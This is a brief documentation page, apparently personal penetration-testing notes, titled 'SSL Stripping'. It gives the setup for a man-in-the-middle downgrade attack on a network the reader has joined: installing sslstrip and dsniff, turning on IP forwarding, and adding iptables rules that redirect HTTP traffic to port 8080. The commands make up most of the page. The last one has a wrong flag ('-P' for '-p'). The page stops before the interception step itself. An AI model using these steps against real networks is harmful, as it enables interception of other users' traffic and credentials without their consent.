---
title: SSL Stripping 
type: docs
---

After we connect to a network we can see all traffic on it, which is not very useful because most important traffic is encrypted.  
Install `sslstrip` and `dsniff`  

`echo 1 > /proc/sys/net/ipv4/ip_forward`
Add rule - `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`  
Verify Rule - `iptables -t nat -L PREROUTING`

Ensure redirect port is open - `iptables -I INPUT 1 -P tcp --dport 8080`
